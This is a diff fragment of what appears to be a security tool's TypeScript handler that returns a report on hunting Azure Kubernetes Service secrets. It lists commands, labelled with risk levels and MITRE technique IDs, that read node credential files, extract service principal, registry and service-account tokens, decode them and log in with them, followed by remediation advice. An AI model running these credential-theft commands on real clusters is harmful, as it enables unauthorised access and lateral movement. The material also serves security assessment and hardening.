+\`\`\`
+
+---
+
+### 7. Service Principal Credentials (TC-AKSSEC-007)
+**Risk:** CRITICAL | **MITRE:** T1552.001 - Credentials In Files
+
+\`\`\`bash
+# Check azure.json on node (contains SP or managed identity info)
+kubectl debug node/<node> -it --image=mcr.microsoft.com/azure-cli -- cat /etc/kubernetes/azure.json
+
+# Find SP secrets in K8s
+kubectl get secrets -A -o json | jq -r '.items[] | select(.data | keys[] | test("client|secret|sp|serviceprincipal"; "i")) | "\\(.metadata.namespace)/\\(.metadata.name)"'
+
+# Login with stolen SP
+az login --service-principal -u <aadClientId> -p <aadClientSecret> --tenant <tenantId>
+\`\`\`
+
+---
+
+### 8. Container Registry Credentials (TC-AKSSEC-009)
+**Risk:** HIGH | **MITRE:** T1552.001 - Credentials In Files
+
+\`\`\`bash
+# Find docker registry secrets
+kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/dockerconfigjson") | "\\(.metadata.namespace)/\\(.metadata.name)"'
+
+# Extract registry creds
+kubectl get secret <registry-secret> -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq -r '.auths | to_entries[] | "\\(.key): \\(.value.auth | @base64d)"'
+
+# Use credentials
+docker login <registry> -u <user> -p <password>
+\`\`\`
+
+---
+
+### 9. Service Account Tokens (TC-AKSSA-001)
+**Risk:** CRITICAL | **MITRE:** T1528 - Steal Application Access Token
+
+\`\`\`bash
+# Find SA token secrets
+kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | "\\(.metadata.namespace)/\\(.metadata.name)"'
+
+# Steal token from compromised pod
+TOKEN=\\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# Check permissions
+kubectl auth can-i --list --token=\\$TOKEN
+
+# Use token
+kubectl --token=\\$TOKEN get pods -A
+\`\`\`
+
+---
+
+## Remediation Summary
+
+1. **Enable Workload Identity** instead of pod managed identity
+2. **Use Key Vault CSI driver** for secret injection
+3. **Disable automountServiceAccountToken** on default SA
+4. **Use short-lived projected tokens** instead of legacy secrets
+5. **Apply RBAC restrictions** on secret access
+6. **Enable audit logging** for secret access events
+`;
+
+          return {
+            content: [{ type: 'text', text: report }],
+          };
+        } catch (error: any) {
+          return {
+            content: [{ type: 'text', text: `Error hunting AKS secrets: ${error.message}` }],
             isError: true,
           };
         }
